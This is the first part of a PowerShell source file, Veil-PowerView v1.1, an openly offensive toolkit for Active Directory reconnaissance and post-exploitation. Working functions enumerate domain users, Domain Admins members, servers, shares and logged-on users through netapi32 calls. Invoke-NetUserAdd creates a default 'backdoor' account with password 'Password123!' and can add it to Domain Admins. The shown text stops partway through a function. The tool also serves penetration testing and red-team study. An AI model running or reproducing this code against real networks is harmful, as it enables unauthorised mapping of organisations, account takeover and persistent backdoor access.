<#

Veil-PowerView v1.1

See README.md for more information.

by @harmj0y
#>

# all of the needed .dll imports
$signature = @'
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetWkstaUserEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetSessionEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        [In,MarshalAs(UnmanagedType.LPWStr)] string UncClientName,
        [In,MarshalAs(UnmanagedType.LPWStr)] string UserName,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetConnectionEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        [In,MarshalAs(UnmanagedType.LPWStr)] string qualifier,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetServerEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        Int32 servertype,
        [In,MarshalAs(UnmanagedType.LPWStr)] string domain,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetFileEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        [In,MarshalAs(UnmanagedType.LPWStr)] string BasePath,
        [In,MarshalAs(UnmanagedType.LPWStr)] string UserName,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetUserEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        Int32 Level,
        Int32 filter,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetShareEnum(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        Int32 Level,
        out IntPtr bufptr,
        int prefmaxlen,
        ref Int32 entriesread,
        ref Int32 totalentries,
        ref Int32 resume_handle);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern int NetServerGetInfo(
        [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
        Int32 Level,
        out IntPtr bufptr);
[DllImport("netapi32.dll", SetLastError=true)]
public static extern uint NetApiBufferFree(IntPtr buffer);
[DllImport("Advapi32.dll", SetLastError=true)]
public static extern int OpenSCManagerW(
        [In,MarshalAs(UnmanagedType.LPWStr)] string lpMachineName,
        [In,MarshalAs(UnmanagedType.LPWStr)] string lpDatabaseName,
        int dwDesiredAccess);
[DllImport("Advapi32.dll", SetLastError=true)]
public static extern int CloseServiceHandle(
        Int32 hSCObject);
[DllImport("Kernel32.dll")]
public static extern uint GetLastError();
'@

# Add the function definition
Add-Type -MemberDefinition $signature -Name Win32Util -Namespace Pinvoke -Using Pinvoke


function Get-ShuffledArray {
    <#
    .SYNOPSIS
    Returns a randomly-shuffled version of a passed array.
    
    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.
    
    .PARAMETER gnArr
    The passed array to shuffle.

    .OUTPUTS
    System.Array. The passed array but shuffled.
    
    .EXAMPLE
    > $shuffled = Get-ShuffledArray $array
    Get a shuffled version of $array.

    .LINK
    http://sqlchow.wordpress.com/2013/03/04/shuffle-the-deck-using-powershell/
    #>
    param( [Array] $gnArr )
    $len = $gnArr.Length;
    while($len){
        $i = Get-Random ($len --);
        $tmp = $gnArr[$len];
        $gnArr[$len] = $gnArr[$i];
        $gnArr[$i] = $tmp;
    }
    return $gnArr;
}

function Get-HostIP {
    <#
    .SYNOPSIS
    Takes a hostname and resolves it an IP.
    
    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.
    
    .OUTPUTS
    System.String. The IPv4 address.
    
    .EXAMPLE
    > Get-HostIP -hostname SERVER
    Return the IPv4 address of 'SERVER'
    #>

    [CmdletBinding()]
    param(
        # default to the localhost
        [string]$hostname = ""
    )
    try{
        # get the IP resolution of this specified hostname
        $results = @(([net.dns]::GetHostEntry($hostname)).AddressList)

        if ($results.Count -ne 0){
            foreach ($result in $results) {
                # make sure the returned result is IPv4
                if ($result.AddressFamily -eq "InterNetwork") {
                    $result.IPAddressToString
                }
            }
        }
    }
    catch{ }
}

function Test-Server {
    <#
    .SYNOPSIS
    Tests a connection to a remote server.
    
    .DESCRIPTION
    This function uses either ping (test-connection) or RPC
    (through WMI) to test connectivity to a remote server.

    .PARAMETER Server
    The hostname/IP to test connectivity to.

    .OUTPUTS
    $true/$false
    
    .EXAMPLE
    > Test-Server -Server WINDOWS7
    Tests ping connectivity to the WINDOWS7 server.

    .EXAMPLE
    > Test-Server -RPC -Server WINDOWS7
    Tests RPC connectivity to the WINDOWS7 server.

    .LINK
    http://gallery.technet.microsoft.com/scriptcenter/Enhanced-Remote-Server-84c63560#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] [String] $Server,
        [Parameter(Mandatory = $False)] [Switch] $RPC
    )

    if ($RPC){
        $WMIParameters = @{
                        namespace = 'root\cimv2'
                        Class = 'win32_ComputerSystem'                                      
                        ComputerName = $Name
                        ErrorAction = "Stop" 
                      }
        if ($Credential -ne $null)
        {
            $WMIParameters.Credential = $Credential
        }
        try
        {
            Get-WmiObject @WMIParameters
        }
        catch { } 
    }
    # otherwise, use ping
    else{
        test-connection $Server -count 1 -Quiet
    }
}

function Get-NetDomain {
    <#
    .SYNOPSIS
    Gets the name of the current user's domain.
    
    .DESCRIPTION
    This function utilizes ADSI (Active Directory Service Interface) to
    get the currect domain root and return its distinguished name.
    It then formats the name into a single string.
    
    .PARAMETER Base
    Just return the base of the current domain (i.e. no .com)

    .OUTPUTS
    System.String. The full domain name.
    
    .EXAMPLE
    > Get-NetDomain
    Return the current domain.

    .EXAMPLE
    > Get-NetDomain -base
    Return just the base of the current domain.

    .LINK
    http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)] [Switch] $Base
    )

    # just get the base of the domain name
    if ($Base.IsPresent){
        $temp = [string] ([adsi]'').distinguishedname -replace "DC=","" -replace ",","."
        $parts = $temp.split(".")
        $parts[0..($parts.length-2)] -join "."
    }
    else{
        ([adsi]'').distinguishedname -replace "DC=","" -replace ",","."
    }
}

function Get-NetDomainControllers 
{
    <#
    .SYNOPSIS
    Return the current domain controllers for the active domain.
    
    .DESCRIPTION
    Uses DirectoryServices.ActiveDirectory to return the current domain 
    controllers.

    .PARAMETER Domain
    The domain whose domain controller to get. If not given, gets the 
    current computer's domain controller.

    .OUTPUTS
    System.Array. An array of found machines.

    .EXAMPLE
    > Get-NetDomainControllers
    Returns the domain controller for the current computer's domain.  
    Approximately equivialent to the hostname given in the LOGONSERVER 
    environment variable.
    #>

    [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
}

function Get-NetCurrentUser {
    <#
    .SYNOPSIS
    Gets the name of the current user.
    
    .DESCRIPTION
    This function returns the username of the current user context,
    with the domain appended if appropriate.
    
    .OUTPUTS
    System.String. The current username.
    
    .EXAMPLE
    > Get-NetCurrentUser
    Return the current user.
    #>

    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}


function Get-NetUsers {
    <#
    .SYNOPSIS
    Gets a list of all current users in the domain.
    
    .DESCRIPTION
    This function will user DirectoryServices.AccountManagement query the
    current domain for all users.
    This is a replacement for "net users /domain"

    .OUTPUTS
    System.DirectoryServices.AccountManagement.UserPrincipal objects representing
    each user found.

    .EXAMPLE
    > Get-NetUsers
    Returns the member users of the current domain.
    #>

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # create the domain context and build the user principal object
    $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
    $UserPrincipal = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ct)

    # set the wildcard
    $UserPrincipal.SamAccountName = '*'

    # execute the principal searher
    $searcher = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher
    $searcher.QueryFilter = $UserPrincipal
    
    # optional:
    # $userSearcher = [adsisearcher]"(&(samAccountType=805306368))"
    # $userSearcher.FindAll() |foreach {$_.properties.name}

    $searcher.FindAll()
}


function Get-NetUsersAPI {
    <#
    .SYNOPSIS
    Gets a list of all current users in the domain.
    
    .DESCRIPTION
    This function will execute the NetUserEnum Win32API call to query
    the a domain controller for the current AD user list. If no domain
    controller is specified, it defaults to the default DC for the 
    local computer. This is a replacement for "net users /domain".

    .PARAMETER DC
    The domain controller to query. If not given, the default domain 
    controller for the local machine is used.

    .PARAMETER Complete
    Return complete user information instead of just usernames.
        
    .OUTPUTS
    System.Array. An array of found users.

    .EXAMPLE
    > Get-NetUsersAPI
    Returns the member users of the current domain.
    
    .EXAMPLE
    > Get-NetUsersAPI -DC DomainController2
    Returns the users controller for the DomainController2 domain controller.
    #>
    
    [CmdletBinding()]
    param(
        [string]$DC = $null,
        [Parameter(Mandatory = $False)] [Switch] $Complete
    )

    # USER_INFO_0 structure 
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/aa370961(v=vs.85).aspx
    $UserInfoStructure = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct USER_INFO_0
    {
        [MarshalAs(UnmanagedType.LPWStr)] public String usri0_name;
    }
}
'@

    # Add the custom structure
    Add-Type $UserInfoStructure
    $x = New-Object pinvoke.USER_INFO_0
    $type = $x.gettype()

    $FoundUsers = @();

    # Declare the reference variables
    $QueryLevel = 0
    $ptrInfo = 0
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # actually execute the NetUserEnum api command
    $Result = [pinvoke.Win32Util]::NetUserEnum($DC,$QueryLevel,0,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    Write-Verbose "Get-NetUsers result: $Result"
    
    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $FoundUsers += $Info.usri0_name
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
    }
    # cleanup the ptr buffer
    $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    $FoundUsers
}


function Get-NetUser {
    <#
    .SYNOPSIS
    Returns data for a specified domain user.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to query
    the current AD context for users in a specified group, and then
    queries information for each user in that group. If no GroupName is 
    specified, it defaults to querying the "Domain Admins" group. 

    .PARAMETER UserName
    The domain username to query for. If not given, it defaults to "administrator"
        
    .OUTPUTS
    System.DirectoryServices.AccountManagement.UserPrincipal. A user object
    with associated data descriptions

    .EXAMPLE
    > Get-NetUser
    Returns data about the "administrator" user for the current domain.

    .EXAMPLE
    > Get-NetGroup -UserName "jsmith"
    Returns data about user "jsmith" in the current domain.  
    #>

    [CmdletBinding()]
    param(
        [string]$UserName = "administrator"
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain

    # Types-  http://msdn.microsoft.com/en-us/library/bb356425(v=vs.110).aspx
    [system.directoryservices.accountmanagement.userprincipal]::findbyidentity(
        $ct, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
}


function Invoke-NetUserAdd {
    <#
    .SYNOPSIS
    Adds a local or domain user.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to add a
    user to the local machine or domain (if permissions allow). It will
    default to adding to the local machine. An optional group name to
    add the user to can be specified.

    .PARAMETER UserName
    The username to add. If not given, it defaults to "backdoor"

    .PARAMETER Password
    The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER GroupName
    Group to optionally add the user to.

    .PARAMETER Domain
    Add the user to the domain instead of locally.
        
    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Invoke-NetUserAdd -UserName john -Password password
    Adds a localuser "john" to the machine with password "password"

    .EXAMPLE
    > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain
    Adds the user "john" with password "password" to the domain and adds
    the user to the domain group "Domain Admins" 

    .Link
    http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
    #>

    [CmdletBinding()]
    Param (
        [string]$UserName = "backdoor",
        [string]$Password = "Password123!",
        [string]$GroupName = "",
        [Parameter(Mandatory = $False)] [Switch] $Domain
    )

    if ($Domain.IsPresent){

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/

        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain

        # get the local domain
        $d = Get-NetDomain

        # get the domain context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d

        # create the user object
        $usr = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $context

        # set user properties
        $usr.name = $UserName
        $usr.SamAccountName = $UserName
        $usr.PasswordNotRequired = $false
        $usr.SetPassword($password)
        $usr.Enabled = $true

        # commit the user
        $usr.Save()
    }
    else{
        $objOu = [ADSI]"WinNT://localhost"
        $objUser = $objOU.Create("User", $UserName)
        $objUser.SetPassword($Password)
        # $objUser.Properties | Select-Object # full object properties

        # commit the changes to the local machine
        try{ 
            $b = $objUser.SetInfo()
        }
        catch{
            # TODO: error handling if permissions incorrect
            Write-Verbose "[!] Account already exists!"
        }
    }

    # if a group is specified, invoke Invoke-NetGroupUserAdd and return its value
    if ($GroupName -ne ""){
        # if we're adding to the domain, make sure to include the flag
        if ($Domain.IsPresent){
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -Domain
        }
        # otherwise, we're adding to a local group
        else{
            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName
        }
    }

}

function Get-NetGroups {
    <#
    .SYNOPSIS
    Gets a list of all current groups in the local domain.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to query
    the current AD context for current groups.
        
    .OUTPUTS
    System.Array. An array of found groups.

    .EXAMPLE
    > Get-NetGroups
    Returns the current groups in the domain.
    #>

    [CmdletBinding()]
    Param (
        [string]$GroupName = "*"
    )

    $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
	$groupSeacher.PageSize = 200
    $groupSearcher.FindAll() |foreach {$_.properties.samaccountname}
}


function Get-NetGroup {
    <#
    .SYNOPSIS
    Gets a list of all current users in a specified domain group.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to query
    the current AD context for users in a specified group. If no
    GroupName is specified, it defaults to querying the "Domain Admins"
    group. This is a replacement for "net group 'name' /domain"

    .PARAMETER GroupName
    The group name to query for users. If not given, it defaults to "domain admins"
        
    .OUTPUTS
    System.Array. An array of found users for the specified group.

    .EXAMPLE
    > Get-NetGroup
    Returns the usernames that of members of the "Domain Admins" domain group.
    
    .EXAMPLE
    > Get-NetGroup -GroupName "Power Users"
    Returns the usernames that of members of the "Power Users" domain group.

    .LINK
    http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins"
    )

    $FoundMembers = @()

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
    $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($ct,$GroupName)

    if ($group -ne $null) {
        try{
			$members = $group.GetMembers($true)
		
			foreach ($member in $members){
				$FoundMembers += $member.SamAccountName
			}
		}
		catch {}
    }
    $FoundMembers
}


function Get-NetGroupUsers {
    <#
    .SYNOPSIS
    Returns data for each user in a specified group.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to query
    the current AD context for information about a specific user. If no
    user is specified, "administrator" is used. This is a replacement 
    for "net user 'username' /domain"

    .PARAMETER GroupName
    The group name to query for users. If not given, it defaults to "domain admins"

    .PARAMETER UserData
    Return full user data objects instead of just user names (the default)

    .OUTPUTS
    System.Array. Array of System.DirectoryServices.AccountManagement.UserPrincipal 
    objects (user objects with associated data descriptions)

    .EXAMPLE
    > Get-NetGroupUsers
    Returns data about all users in "Domain Admins"

    .EXAMPLE
    > Get-NetGroupUsers -GroupName "Power Users"
    Returns data about all users in the "Power Users" domain group.
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins",
		[Parameter(Mandatory = $False)] [Switch] $UserData
    )

    $MemberInfo = @()

	$groups = Get-NetGroups -GroupName $GroupName
	
	foreach ($group in $groups){
	    $GroupMembers = Get-NetGroup -GroupName $group

		foreach ($member in $GroupMembers){
			if ($member){
				$info = Get-NetUser -UserName $member
				if ($UserData.IsPresent){
					$MemberInfo += $info
				}
				else{
					$MemberInfo += $info.SamAccountName
				}
				
			}
		}
	}
	
	if ($UserData.IsPresent){
		$MemberInfo
	}
	else{
		$MemberInfo| Get-Unique
	}
}


function Invoke-NetGroupUserAdd {
    <#
    .SYNOPSIS
    Adds a local or domain user to a local or domain group.
    
    .DESCRIPTION
    This function utilizes DirectoryServices.AccountManagement to add a
    user to a local machine or domain group (if permissions allow). It will
    default to addingt to the local machine.

    .PARAMETER UserName
    The domain username to query for.

    .PARAMETER GroupName
    Group to add the user to.

    .PARAMETER Domain
    Add the user to the domain instead of locally.
        
    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Invoke-NetGroupUserAdd -UserName john -GroupName Administrators
    Adds a localuser "john" to the local group "Administrators"

    .EXAMPLE
    > Invoke-NetGroupUserAdd -UserName john -GroupName "Domain Admins" -Domain
    Adds the existing user "john" to the domain group "Domain Admins" 
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] [string]$UserName,
        [Parameter(Mandatory = $True)] [string]$GroupName,
        [Parameter(Mandatory = $False)] [Switch] $Domain)

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    if ($Domain.IsPresent){
        # get the domain context
        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
    }
    else{
        # get the local machine context
        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
    }

    # find the particular group
    $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($ct,$GroupName)

    # add the particular user to the localgroup
    $group.Members.add($ct, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

    # commit the changes
    $group.Save()
}


function Get-NetServers {
    <#
    .SYNOPSIS
    Gets a list of all current servers in the domain.
    
    .DESCRIPTION
    This function uses an ADSI searcher to enumerate all machines in the
    current Active Directory domain.

    .PARAMETER ServerName
    Search for a particular server name, wildcards of * accepted.
    
    .OUTPUTS
    System.Array. An array of found machines.

    .EXAMPLE
    > Get-NetServers
    Returns the servers that are a part of the current domain.

    .EXAMPLE
    > Get-NetServers -ServerName WIN-*
    Find all servers with hostnames that start with "WIN-""
    #>

    [CmdletBinding()]
    param(
        [string]$ServerName = "*"
        )

    $computerSearcher = [adsisearcher]"(&(objectClass=computer) (name=$ServerName))"
	$computerSearcher.PageSize = 200
    $computerSearcher.FindAll() |foreach {$_.properties.dnshostname}
}


function Get-NetServersAPI {
    <#
    .SYNOPSIS
    Gets a list of all current servers in the domain using the Windows API.
    
    .DESCRIPTION
    This function will execute the NetServerEnum Win32API call to query
    the a domain controller for the domain server list. If no domain
    is specified, the cmdlet Get-NetDomain is invoked to get the domain
    of the current host

    .PARAMETER Domain
    The domain to query machines for. If not given, the default domain 
    is found using Get-NetDomain and used.

    .PARAMETER ServerType
    The SV_101 server type to search for. It defaults to 2 for 
    all servers in the domain. Other interesting values are 4 for SQL servers,
    8 for domain controllers, and 16 for backup domain controllers. See
    http://msdn.microsoft.com/en-us/library/windows/desktop/aa370903(v=vs.85).aspx for more server types
    for all server types.
    
    .OUTPUTS
    System.Array. An array of found machines.

    .EXAMPLE
    > Get-NetServers
    Returns the servers that are a part of the current domain.

    .EXAMPLE
    > Get-NetServers -ServerType 16
    Returns a list of the backup domain controllers for the current domain.

    .EXAMPLE
    > Get-NetServers -Domain "company.com"
    Returns the servers that are a member of the company.com domain.
    #>

    [CmdletBinding()]
    param(
        [string]$Domain = "none",
        [UInt32]$ServerType = 2
    )

    # if a domain wasn't specified, try to get the domain of this
    # host using Get-NetDomain
    if ($Domain -eq "none"){
        $domain = Get-NetDomain -base
    }

    # SERVER_INFO_101 structure 
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/aa370903(v=vs.85).aspx
    $ServerInfoStruture = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct SERVER_INFO_101
    {
        public UInt32 sv101_platform_id;
        [MarshalAs(UnmanagedType.LPWStr)] public String sv101_name;
        public UInt32 sv101_version_major;
        public UInt32 sv101_version_minor;
        public UInt32 sv101_type;
        [MarshalAs(UnmanagedType.LPWStr)] public String sv101_comment;
    }
}
'@

    # Add the custom structure
    try { Add-Type $ServerInfoStruture } catch {}
    $x = New-Object pinvoke.SERVER_INFO_101
    $type = $x.gettype()

    $FoundServers = @();

    # Declare the reference variables
    $QueryLevel = 101
    $ptrInfo = 0
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0
    # See http://msdn.microsoft.com/en-us/library/windows/desktop/aa370903(v=vs.85).aspx for more server types

    # actually execute the NetServerEnum api command
    $Result = [pinvoke.Win32Util]::NetServerEnum($null,101,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,$ServerType,$Domain,[ref]$ResumeHandle)

    Write-Verbose "Get-NetServers result: $Result"

    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $FoundServers += $Info.sv101_name
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }    
    }
    $FoundServers
}


function Get-NetServerGetInfo {
    <#
    .SYNOPSIS
    Gets information on a specified server on the domain.
    
    .DESCRIPTION
    This function will execute the NetServerGetInfo Win32API call to query
    a given host for information.

    .PARAMETER HostName
    The hostname to query for information.

    .OUTPUTS
    SERVER_INFO_101 structure. A representation of the SERVER_INFO_101
    result structure.

    .EXAMPLE
    > Get-NetServerGetInfo
    Returns information about the local host.

    .EXAMPLE
    > Get-NetServerGetInfo -HostName sqlserver
    Returns information about the 'sqlserver' host
    #>

    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost"
    )

    # SERVER_INFO_101 structure 
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/aa370903(v=vs.85).aspx
    $ServerInfoStruture = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct SERVER_INFO_101
    {
        public uint sv101_platform_id;
        [MarshalAs(UnmanagedType.LPWStr)] public String sv101_name;
        public uint sv101_version_major;
        public uint sv101_version_minor;
        public UInt32 sv101_type;
        [MarshalAs(UnmanagedType.LPWStr)] public String sv101_comment;
    }
}
'@

    # Add the custom structure
    try { Add-Type $ServerInfoStruture } catch {}
    $x = New-Object pinvoke.SERVER_INFO_101
    $type = $x.gettype()

    # Declare the reference variables
    $QueryLevel = 101
    $ptrInfo = 0 

    # actually execute the NetServerGetInfo api command
    $Result = [pinvoke.Win32Util]::NetServerGetInfo($HostName, $QueryLevel,[ref]$ptrInfo)

    Write-Verbose "Get-NetServerGetInfo result: $Result"

    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        $newintptr = New-Object system.Intptr -ArgumentList $offset

        $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
        $Info | Select-Object *

        # cleanup the ptr buffer
        $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    }
}


function Get-NetFileServers {
    <#
    .SYNOPSIS
    Returns a list of all file servers extracted from user home directories.
    
    .DESCRIPTION
    This function pulls all user information, extracts all file servers from
    user home directories, and returns the uniquified list.

    .OUTPUTS
    System.Array. An array of found fileservers.

    .EXAMPLE
    > Get-NetFileServers
    Returns active file servers.
    #>

    $FileServers = @()

    # get all the domain users
    $users = Get-NetUsers

    # extract all home directories and create a unique list
    foreach ($user in $users){
        
        # pull the HomeDirectory field from this user record
        $d = $user.HomeDirectory

        if (($d -ne $null) -and ($d.trim() -ne "")){
            # extract the server name from the homedirectory path
            $parts = $d.split("\")
            if ($parts.count -gt 2){
                # append the base file server to the target $FileServers list
                $FileServers += $parts[2]
            }
        }
    }

    # uniquify the fileserver list
    $t = $FileServers | Get-Unique
    ([Array]$t)
}


function Get-NetShare {
    <#
    .SYNOPSIS
    Gets share information for a specified server.
    
    .DESCRIPTION
    This function will execute the NetShareEnum Win32API call to query
    a given host for open shares. This is a replacement for
    "net share \\hostname"

    .PARAMETER HostName
    The hostname to query for shares.

    .OUTPUTS
    SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
    result structure which includes the name and note for each share.

    .EXAMPLE
    > Get-NetShare
    Returns active shares on the local host.

    .EXAMPLE
    > Get-NetShare -HostName sqlserver
    Returns active shares on the 'sqlserver' host
    #>

    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost"
    )

    # SHARE_INFO_1 structure 
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/bb525407(v=vs.85).aspx
    $ShareInfoStructure = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct SHARE_INFO_1
    {
        [MarshalAs(UnmanagedType.LPWStr)] public String shi1_netname;
        public uint shi1_type;
        [MarshalAs(UnmanagedType.LPWStr)] public String shi1_remark;
    }
}
'@

    # Add the custom structure
    Add-Type $ShareInfoStructure
    $x = New-Object pinvoke.SHARE_INFO_1
    $type = $x.gettype()

    # Declare the reference variables
    $QueryLevel = 1
    $ptrInfo = 0 
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # actually execute the NetShareEnum api command
    $Result = [pinvoke.Win32Util]::NetShareEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    Write-Verbose "Get-NetShare result: $Result"

    # 0 = success
    if ($Result -eq 0){

        # Locate the offset of the initial intPtr
        $offset = $ptrInfo.ToInt64()

        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = [System.Runtime.Interopservices.Marshal]::SizeOf($x)

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = [system.runtime.interopservices.marshal]::PtrToStructure($newintptr,$type)
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # cleanup the ptr buffer
        $t = [pinvoke.Win32Util]::NetApiBufferFree($ptrInfo)
    }
}


function Get-NetLoggedon {
    <#
    .SYNOPSIS
    Gets users actively logged onto a specified server.
    
    .DESCRIPTION
    This function will execute the NetWkstaUserEnum Win32API call to query
    a given host for actively logged on users.

    .PARAMETER HostName
    The hostname to query for logged on users.

    .OUTPUTS
    WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
    result structure which includes the username and domain of logged on users.

    .EXAMPLE
    > Get-NetLoggedon
    Returns users actively logged onto the local host.

    .EXAMPLE
    > Get-NetLoggedon -HostName sqlserver
    Returns users actively logged onto the 'sqlserver' host.
    #>

    [CmdletBinding()]
    param(
        # default to querying the localhost if no name is supplied
        [string]$HostName = "localhost"
    )

    # WKSTA_USER_INFO structure 
    #   http://msdn.microsoft.com/en-us/library/windows/desktop/aa371409(v=vs.85).aspx
    $WkstUserStructure = @'
namespace pinvoke {
using System;
using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WKSTA_USER_INFO_1
    {
        [MarshalAs(UnmanagedType.LPWStr)] public String wkui1_username;
        [MarshalAs(UnmanagedType.LPWStr)] public String wkui1_logon_domain;
        [MarshalAs(UnmanagedType.LPWStr)] public String wkui1_oth_domains;
        [MarshalAs(UnmanagedType.LPWStr)] public String wkui1_logon_server;
    }
}
'@

    # Add the custom structure
    Add-Type $WkstUserStructure
